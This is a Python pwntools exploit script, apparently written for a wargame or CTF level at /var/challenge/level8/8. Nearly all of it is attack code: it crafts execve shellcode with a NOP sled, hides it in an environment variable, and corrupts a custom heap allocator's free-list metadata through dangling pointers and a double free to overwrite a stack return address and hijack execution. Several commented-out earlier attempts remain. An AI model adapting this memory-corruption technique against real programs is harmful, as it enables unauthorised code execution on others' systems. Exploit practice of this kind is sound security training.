#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./8AAAAAAA
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF(args.EXE or './8AAAAAAA')
exe = context.binary = ELF(args.EXE or '/var/challenge/level8/8')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# jump over the 8 bytes that are being set by free_list_remove
jumper = asm('jmp short $+20') 
print(len(jumper))


l33tpath = '/usr/local/bin/l33t'
shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode

shellcode = shellcode[:68] + jumper + shellcode[68 + len(jumper):]

# Start with a custom empty env
env = {
    "SHOULD_NOT_SEE": "yes",
    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
}

# env['L33T'] = env['L33T'][:68] + jumper + env['L33T'][68 + len(jumper):]
env['L33T'] = 68 * 0x90.to_bytes(1, 'little') + jumper + (len(shellcode) - (68 + len(jumper))) * b"A"


shellcode_addr = (0x7fffffffeec8 + 50)
shellcode_addr_packed = p64(shellcode_addr)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        env["L33T"] = shellcode
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

ENTRY_FLAG_LAST = 1

io = start()

# alloc 6 * 40 bytes
io.sendline(b"s a=" + 38 * b"A")
io.sendline(b"s b=" + 38 * b"B")
io.sendline(b"s c=" + 38 * b"C")
io.sendline(b"s d=" + 38 * b"D") # mem barrier

return_addr = 0x7fffffffe938

# metadata information for the second block (only prev and next matter)
b2_size = p64(0)
b2_free_prev = p64(return_addr - 16) #8*0x99.to_bytes(1, 'little')  
b2_free_next = p64(shellcode_addr) #8*0x88.to_bytes(1, 'little')
b2_block_prev = p64(0)

io.sendline(b"s e=" + 6 * b"E" + b2_size + b2_free_prev + b2_free_next + b2_block_prev)

# io.sendline(b"s e=" + 6 * b"E")
# io.sendline(b"s f=" + 6 * b"F")
# io.sendline(b"s g=" + 6 * b"G") # mem barrier

# free b and c by allocating larger buffers (this keeps pairs[1] and pairs[2].data dangling)
io.sendline(b"s b=" + 200 * b"b")
io.sendline(b"s c=" + 200 * b"c")

return_addr = 0x7fffffffe918

# metadata information for the first block (only size matters)
b1_size = p64((200) & ~ENTRY_FLAG_LAST)
b1_free_prev = p64(0)
b1_free_next = p64(0)
b1_block_prev = p64(0)

# the free_first now points to pairs[1]. so if we malloc exactly the space of old b + sizeof entry + old c, then we can overwrite the metadata that pairs[2] uses
io.sendline(b"s x=" + 46 * b"X" + b1_size + b1_free_prev + b1_free_next + b1_block_prev + b"y=" + 38 * b"Y")

# now free pairs[4] and pairs[5] by allocating larger buffers
# io.sendline(b"s e=" + 200 * b"e")
# io.sendline(b"s f=" + 200 * b"f")

# # allocate a new key that takes the space of pairs[4] and pairs[5]
# io.sendline(b"s s=" + 14 * b"S" + size + free_prev + free_next + block_prev + b"z=" + 6 * b"Z")

# io.sendline(b"s x=" + 14 * b"X" + 8 * 0x69.to_bytes(1, 'little') + free_prev + free_next + block_prev + b"y=" + 6 * b"P")

# trigger a double free by setting a larger value for y (at pairs[2])
io.sendline(b"s y=" + 200 * b"Y")

# now we can allocate everything

# overwrite the metadata of pairs[2] with something funky
# size = p64(0)
# free_prev = p64(0) 
# free_next = p64(0x7fffffffe978 - 2) # this is the return address that we need to overwrite (-2 for "r=")
# block_prev = p64(0)
# io.sendline(b"s x=" + 14 * b"X" + size + free_prev + free_next + block_prev) # + b"z=" + 6 * b"Z")

# overwrite the return address
# io.sendline(b"s r=" + shellcode_addr_packed)

# 0x7fffffffe97e

# # allocate small buffer
# io.sendline(b"s a=" + 60 * b"A")
# io.sendline(b"s b=" + 60 * b"B")

# # reallocate them with a larger value (causes a free with dangling pointer in the pairs array)
# io.sendline(b"s a=" + 145 * b"D")
# # 62 filler bytes, then the alloc metadata (32 bytes), then the new key data (value not important)
# struct_size = 8 * b"\0"
# free_prev_ptr = 8 * b"\1"
# free_next_ptr = 8 * b"\2"
# block_prev_ptr = 8 * b"\3"
# struct_metadata = struct_size + free_prev_ptr + free_next_ptr + block_prev_ptr
# io.sendline(b"s b=" + 62 * b"E" + struct_metadata + b"newkey=mysexytestest" + 31 * b"X")
# # now you can "g newkey" and it wilkl work, even tho it was not added with "s" 






io.interactive()

    

